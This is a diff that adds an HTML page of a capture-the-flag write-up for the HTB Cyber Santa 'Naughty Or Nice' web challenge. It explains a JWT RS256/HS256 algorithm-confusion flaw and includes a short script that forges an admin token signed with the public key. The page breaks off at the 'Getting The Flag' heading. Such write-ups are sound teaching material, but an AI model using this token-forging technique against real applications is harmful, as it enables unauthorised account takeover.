@@ -1,0 +1,770 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+        <meta name="author" content="Stigward <jmaginnes@gmail.com>">
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.2.3, mkdocs-material-8.0.4">
+    
+    
+      
+        <title>Web - Naughty Or Nice - HTB Cyber Santa CTF - Stigward's Blog</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.2a4617e2.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.9204c3b2.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#ff6e42">
+        
+      
+    
+    
+    
+      
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>function __md_scope(e,t,_){return new URL(_||(t===localStorage?"../..":"../.."),location).pathname+"."+e}function __md_get(e,t=localStorage,_){return JSON.parse(t.getItem(__md_scope(e,t,_)))}function __md_set(e,t,_=localStorage,o){try{_.setItem(__md_scope(e,_,o),JSON.stringify(t))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="deep-orange" data-md-color-accent="deep-orange">
+  
+    
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#naughty-or-nice-web-challenge" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Stigward&#39;s Blog" class="md-header__button md-logo" aria-label="Stigward's Blog" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Stigward's Blog
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Web - Naughty Or Nice - HTB Cyber Santa CTF
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Stigward&#39;s Blog" class="md-nav__button md-logo" aria-label="Stigward's Blog" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    Stigward's Blog
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        Welcome!
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2">
+          CTF Write Ups
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="CTF Write Ups" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          CTF Write Ups
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Web - Naughty Or Nice - HTB Cyber Santa CTF
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        Web - Naughty Or Nice - HTB Cyber Santa CTF
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#tldr" class="md-nav__link">
+    TL;DR:
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#recon" class="md-nav__link">
+    Recon:
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#getting-admin" class="md-nav__link">
+    Getting Admin:
+  </a>
+  
+    <nav class="md-nav" aria-label="Getting Admin:">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#jwt-signing" class="md-nav__link">
+    JWT Signing:
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#jwt-verify" class="md-nav__link">
+    JWT Verify:
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#creating-an-admin-jwt" class="md-nav__link">
+    Creating an Admin JWT:
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#getting-the-flag" class="md-nav__link">
+    Getting The Flag
+  </a>
+  
+    <nav class="md-nav" aria-label="Getting The Flag">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nunjucks-ssti-and-sandbox-escape" class="md-nav__link">
+    Nunjucks SSTI and Sandbox Escape:
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#final-payload" class="md-nav__link">
+    Final Payload:
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tags.html" class="md-nav__link">
+        Tags
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#tldr" class="md-nav__link">
+    TL;DR:
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#recon" class="md-nav__link">
+    Recon:
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#getting-admin" class="md-nav__link">
+    Getting Admin:
+  </a>
+  
+    <nav class="md-nav" aria-label="Getting Admin:">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#jwt-signing" class="md-nav__link">
+    JWT Signing:
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#jwt-verify" class="md-nav__link">
+    JWT Verify:
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#creating-an-admin-jwt" class="md-nav__link">
+    Creating an Admin JWT:
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#getting-the-flag" class="md-nav__link">
+    Getting The Flag
+  </a>
+  
+    <nav class="md-nav" aria-label="Getting The Flag">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nunjucks-ssti-and-sandbox-escape" class="md-nav__link">
+    Nunjucks SSTI and Sandbox Escape:
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#final-payload" class="md-nav__link">
+    Final Payload:
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content" data-md-component="content">
+            <article class="md-content__inner md-typeset">
+              
+                
+
+<h1 id="naughty-or-nice-web-challenge">Naughty Or Nice Web Challenge</h1>
+<h2 id="tldr">TL;DR:</h2>
+<p>Getting the flag on this challenge requires two separate steps. First, we must obtain access to the <code>admin</code> account by
+exploiting a flaw in the JWT verification process. Once inside the <code>admin</code> account, we are able
+to edit the "Naughty and Nice" list displayed on homepage. We can leverage a Server Side Template Injection (SSTI) vulnerability
+to obtain remote code execution and read the flag.</p>
+<h2 id="recon">Recon:</h2>
+<p>Navigating to the site, we are greeted with a "Naughty Or Nice" list and the option to navigate to a sign-in page.</p>
+<p><img alt="naughty_nice_list" src="../img/homepage.png" /></p>
+<p>The sign-in page allows us to register for an account and use our credentials to login. Once logged in,
+we are redirected to the <code>/dashboard</code> endpoint. This endpoint displays a message saying that we "shall not pass".</p>
+<p><img alt="unauth_dashboard" src="../img/unauth_dashboard.png" /></p>
+<p>A quick glance at the code in <code>/challenge/routes/index.js</code> shows the following for a the <code>/dashboard</code> endpoint:</p>
+<div class="highlight"><pre><span></span><code><span class="nx">router</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">&quot;/dashboard&quot;</span><span class="p">,</span> <span class="nx">AuthMiddleware</span><span class="p">,</span> <span class="k">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+  <span class="k">return</span> <span class="nx">db</span>
+    <span class="p">.</span><span class="nx">getUser</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">username</span><span class="p">)</span>
+    <span class="p">.</span><span class="nx">then</span><span class="p">((</span><span class="nx">user</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span><span class="nx">user</span><span class="p">.</span><span class="nx">username</span> <span class="o">==</span> <span class="s2">&quot;admin&quot;</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s2">&quot;admin.html&quot;</span><span class="p">);</span>
+      <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s2">&quot;dashboard.html&quot;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">user</span> <span class="p">});</span>
+    <span class="p">})</span>
+    <span class="p">.</span><span class="k">catch</span><span class="p">(()</span> <span class="p">=&gt;</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mf">500</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="nx">response</span><span class="p">(</span><span class="s2">&quot;Something went wrong!&quot;</span><span class="p">)));</span>
+<span class="p">});</span>
+</code></pre></div>
+<p>This shows that if we are the <code>admin</code> user, then we will get routed to the Admin dashboard. Otherwise we recieve unauthorized page shown above. </p>
+<h2 id="getting-admin">Getting Admin:</h2>
+<details>
+<summary>A Quick Rabbit Hole - SQL Injection</summary>
+<p>Initially I thought that we were to attack the <code>admin</code> authentication process. Looking at the code, we can see that <code>login</code> requests
+are initially routed to a database handler, as shown below with the call to <code>db.loginUser(username, password).</code> </p>
+<p><div class="highlight"><pre><span></span><code><span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s2">&quot;/api/login&quot;</span><span class="p">,</span> <span class="k">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+  <span class="kd">const</span> <span class="p">{</span> <span class="nx">username</span><span class="p">,</span> <span class="nx">password</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="nx">username</span> <span class="o">&amp;&amp;</span> <span class="nx">password</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nx">db</span>
+      <span class="p">.</span><span class="nx">loginUser</span><span class="p">(</span><span class="nx">username</span><span class="p">,</span> <span class="nx">password</span><span class="p">)</span>
+      <span class="p">.</span><span class="nx">then</span><span class="p">((</span><span class="nx">user</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+          <span class="nx">JWTHelper</span><span class="p">.</span><span class="nx">sign</span><span class="p">({</span> <span class="nx">username</span><span class="o">:</span> <span class="nx">user</span><span class="p">.</span><span class="nx">username</span> <span class="p">}).</span><span class="nx">then</span><span class="p">((</span><span class="nx">token</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+            <span class="nx">res</span><span class="p">.</span><span class="nx">cookie</span><span class="p">(</span><span class="s2">&quot;session&quot;</span><span class="p">,</span> <span class="nx">token</span><span class="p">,</span> <span class="p">{</span> <span class="nx">maxAge</span><span class="o">:</span> <span class="mf">43200000</span> <span class="p">});</span>
+            <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">response</span><span class="p">(</span><span class="s2">&quot;User authenticated successfully!&quot;</span><span class="p">));</span>
+          <span class="p">});</span>
+        <span class="p">})</span>
+      <span class="p">.</span><span class="k">catch</span><span class="p">(()</span> <span class="p">=&gt;</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mf">403</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="nx">response</span><span class="p">(</span><span class="s2">&quot;Invalid username or password!&quot;</span><span class="p">))</span>
+      <span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mf">500</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="nx">response</span><span class="p">(</span><span class="s2">&quot;Missing parameters!&quot;</span><span class="p">));</span>
+<span class="p">});</span>
+</code></pre></div>
+Being that the web-app uses a SQL database, we might initially think that we could leverage a SQL injection to obtain access to the <code>admin</code> account.
+However, looking at the <code>loginUser</code> function in <code>database.js</code>, we see the following:
+<div class="highlight"><pre><span></span><code><span class="k">async</span> <span class="nx">loginUser</span><span class="p">(</span><span class="nx">user</span><span class="p">,</span> <span class="nx">pass</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">return</span> <span class="ow">new</span> <span class="nb">Promise</span><span class="p">(</span><span class="k">async</span> <span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">reject</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+    <span class="k">try</span> <span class="p">{</span>
+      <span class="kd">let</span> <span class="nx">stmt</span> <span class="o">=</span> <span class="k">await</span> <span class="k">this</span><span class="p">.</span><span class="nx">db</span><span class="p">.</span><span class="nx">prepare</span><span class="p">(</span>
+        <span class="s2">&quot;SELECT username FROM users WHERE username = ? and password = ?&quot;</span>
+      <span class="p">);</span>
+      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">stmt</span><span class="p">);</span>
+      <span class="nx">resolve</span><span class="p">(</span><span class="k">await</span> <span class="nx">stmt</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="nx">user</span><span class="p">,</span> <span class="nx">pass</span><span class="p">));</span>
+    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nx">reject</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span>
+    <span class="p">}</span>
+  <span class="p">});</span>
+<span class="p">}</span>
+</code></pre></div>
+The query uses <code>?</code> placeholders, and thus is safe from SQL injection. For more information about safe practices when using Node and SQL, 
+checkout out <a href="https://www.veracode.com/blog/secure-development/how-prevent-sql-injection-nodejs">this</a> post from Veracode.</p>
+</details>
+<p>Once logged in, we get a JWT token.</p>
+<p><img alt="jwt" src="../img/dashboard_cookie.png" /></p>
+<p>Using <a href="https://jwt.io">jwt.io</a> we can see in the decoded JWT that it is using <code>RS256</code> and the data section contains our username and a public key.</p>
+<p><img alt="jwt_decode" src="../img/jwt.png" /></p>
+<p>Back in the code base, we find <code>JWTHelper.js</code> in the <code>/challenge/helpers/</code> directory. It contains the code to both create and verify the JWT tokens the web-app uses. </p>
+<div class="highlight"><pre><span></span><code><span class="kd">const</span> <span class="nx">jwt</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;jsonwebtoken&#39;</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">NodeRSA</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;node-rsa&#39;</span><span class="p">);</span>
+
+<span class="kd">const</span> <span class="nx">keyPair</span> <span class="o">=</span> <span class="ow">new</span> <span class="nx">NodeRSA</span><span class="p">({</span><span class="nx">b</span><span class="o">:</span> <span class="mf">512</span><span class="p">}).</span><span class="nx">generateKeyPair</span><span class="p">();</span>
+<span class="kd">const</span> <span class="nx">publicKey</span> <span class="o">=</span> <span class="nx">keyPair</span><span class="p">.</span><span class="nx">exportKey</span><span class="p">(</span><span class="s1">&#39;public&#39;</span><span class="p">)</span>
+<span class="kd">const</span> <span class="nx">privateKey</span> <span class="o">=</span> <span class="nx">keyPair</span><span class="p">.</span><span class="nx">exportKey</span><span class="p">(</span><span class="s1">&#39;private&#39;</span><span class="p">)</span>
+
+<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="k">async</span> <span class="nx">sign</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">data</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">assign</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span> <span class="p">{</span><span class="nx">pk</span><span class="o">:</span><span class="nx">publicKey</span><span class="p">});</span>
+        <span class="k">return</span> <span class="p">(</span><span class="k">await</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">sign</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span> <span class="nx">privateKey</span><span class="p">,</span> <span class="p">{</span> <span class="nx">algorithm</span><span class="o">:</span><span class="s1">&#39;RS256&#39;</span> <span class="p">}))</span>
+    <span class="p">},</span>
+    <span class="k">async</span> <span class="nx">verify</span><span class="p">(</span><span class="nx">token</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="p">(</span><span class="k">await</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">verify</span><span class="p">(</span><span class="nx">token</span><span class="p">,</span> <span class="nx">publicKey</span><span class="p">,</span> <span class="p">{</span> <span class="nx">algorithms</span><span class="o">:</span> <span class="p">[</span><span class="s1">&#39;RS256&#39;</span><span class="p">,</span> <span class="s1">&#39;HS256&#39;</span><span class="p">]</span> <span class="p">}));</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<h3 id="jwt-signing">JWT Signing:</h3>
+<p>Lets break down the <code>sign</code> function first. It gets passed a data parameter which, looking back at the <code>/routes/index.js</code>, we see in the handler for a POST 
+request to the <code>/login</code> endpoint has the following format:</p>
+<div class="highlight"><pre><span></span><code><span class="nx">JWTHelper</span><span class="p">.</span><span class="nx">sign</span><span class="p">({</span> <span class="nx">username</span><span class="o">:</span> <span class="nx">user</span><span class="p">.</span><span class="nx">username</span> <span class="p">})</span>
+</code></pre></div>
+<p>On the first line of the function, we see the public key is added to the data object. Next, the <code>sign</code> function from the <code>jsonwebtoken</code> package called.
+Referring to the documentation, this has a function signature of <code>jwt.sign(payload, secretOrPrivateKey, [options, callback])</code>, and we are therefore 
+returning a JWT token that has our username and public key as the data,
+signed by a private key known only to the server, using the <code>RS256</code> algorithm. Seems fairly secure.</p>
+<h3 id="jwt-verify">JWT Verify:</h3>
+<p>Next lets take a look at <code>verify</code>. Here we are given a token as the parameter and return the result of the <code>verify</code> function from the <code>jsonwebtoken</code> package. Again referencing
+the documentation, we see that <code>jsonwebtoken</code>'s verify function has the following function signature: <code>jwt.verify(token, secretOrPublicKey, [options, callback])</code>.
+This lines up with what we would expect, as we see this function being passed our JWT token and the server's public key. However, in our code base, we see the <code>options</code> parameter can verify a token that 
+uses <strong>either</strong> <code>RS256</code> or <code>HS256</code>.
+<div class="highlight"><pre><span></span><code>        <span class="k">return</span> <span class="p">(</span><span class="k">await</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">verify</span><span class="p">(</span><span class="nx">token</span><span class="p">,</span> <span class="nx">publicKey</span><span class="p">,</span> <span class="p">{</span> <span class="nx">algorithms</span><span class="o">:</span> <span class="p">[</span><span class="s1">&#39;RS256&#39;</span><span class="p">,</span> <span class="s1">&#39;HS256&#39;</span><span class="p">]</span> <span class="p">}));</span>
+</code></pre></div></p>
+<div class="admonition note">
+<p class="admonition-title">RS256 vs HS256</p>
+<p><code>RS256</code> uses asymmetric encryption. This means that a public key is used for encryption, and a private key is used for decryption. <code>HS256</code>, on the other hand, uses
+symmetric encryption. This means the <strong>same</strong> key is used for both encryption and decryption. </p>
+</div>
+<h3 id="creating-an-admin-jwt">Creating an Admin JWT:</h3>
+<p>Based on what we observed above, we now have all the information we need to create a verified <code>admin</code> JWT token. The public token is known to us, as it is provided within the <code>data</code> section of the JWT. Within the <code>jwt.verify</code>
+function, the public key is supplied as the <code>secretOrPublicKey</code> parameter. When the JWT header specifies that the algorithm is <code>RS256</code>, <code>jwt.verify</code> interprets the <code>secretOrPublicKey</code> parameter as a public key. 
+However, if the JWT specifies the algorithm <code>HS256</code> in the header, then the <code>jwt.verify</code> function interprets the <code>secretOrPublicKey</code> as a secret! Thus if a token using <code>HS256</code> and signed by our public key was passed to the <code>verify</code> function,
+it would pass!</p>
+<p>This <code>verify</code> function is called in AuthMiddleware like so:
+<div class="highlight"><pre><span></span><code>    <span class="k">return</span> <span class="nx">JWTHelper</span><span class="p">.</span><span class="nx">verify</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">.</span><span class="nx">session</span><span class="p">)</span>
+        <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">username</span> <span class="p">=&gt;</span> <span class="p">{</span>
+            <span class="nx">req</span><span class="p">.</span><span class="nx">data</span> <span class="o">=</span> <span class="nx">username</span><span class="p">;</span>
+            <span class="nx">next</span><span class="p">();</span>
+        <span class="p">})</span>
+        <span class="p">.</span><span class="k">catch</span><span class="p">((</span><span class="nx">e</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span>
+            <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="s1">&#39;/logout&#39;</span><span class="p">);</span>
+        <span class="p">});</span>
+</code></pre></div></p>
+<p>So we can see, once the JWT is verified, the logged in user is determined by the <code>username</code> field in the data section of the JWT.</p>
+<p>Therefore, we can use the following script to create an <code>admin</code> JWT:</p>
+<div class="highlight"><pre><span></span><code><span class="kd">const</span> <span class="nx">jwt</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&quot;jsonwebtoken&quot;</span><span class="p">);</span>
+
+<span class="nx">publicKey</span> <span class="o">=</span> <span class="s2">&quot;-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtCKM9IX5ZlUs8hWTEa75\neu6mU09aoHm5jd36mDjaopQ8alaWcHykhVXXsd9Dfp+m86cV4zIbmH4FnZGw2wQT\nPEv824kR4amWL9X2/7TCu6jgM0SQuA+E7KJvMJTf8ycLqdwx3TQFQVAE35zzlvAw\n+MdONz1uQWXh2f6tz6oT+eD/CLd5rJRjxVyraykECcYBDAjOtOjU5NcnTiwU1t2z\nJ6kOkPlG6t7f5zJ8QnHFByIRDKqsRjCo/2cIdLToBaINt85lZy0j5EyWRM+Sfk6b\nNG+CCmR7v1dE2dUIJ5IeXqQ/KSyOxSV0RNbtp9f5pwilaOG+gFeAPAxW0B3PS/cQ\neQIDAQAB\n-----END PUBLIC KEY-----&quot;</span>
+
+<span class="nx">data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;username&#39;</span><span class="o">:</span> <span class="s1">&#39;admin&#39;</span><span class="p">}</span>
+<span class="nx">data</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">assign</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span> <span class="p">{</span><span class="nx">pk</span><span class="o">:</span><span class="nx">publicKey</span><span class="p">});</span>
+<span class="nx">key</span> <span class="o">=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">sign</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span> <span class="nx">publicKey</span><span class="p">,</span> <span class="p">{</span> <span class="nx">algorithm</span><span class="o">:</span><span class="s1">&#39;HS256&#39;</span> <span class="p">})</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">key</span><span class="p">)</span>
+</code></pre></div>
+<p><img alt="admin_jwt" src="../img/admin_jwt.png" /></p>
+<p>If we decode our new JWT, we now see the following:
+<img alt="admin_decode" src="../img/admin_decode.png" /></p>
+<p>Go back to the web-app, and set our cookie to the new JWT.</p>
+<p><img alt="new_jwt" src="../img/set_cookie.png" /></p>
+<p>Refresh, and we are in the <code>admin</code> dashboard!
+<img alt="admin_dash" src="../img/admin_dashboard.png" /></p>
+<h2 id="getting-the-flag">Getting The Flag</h2>
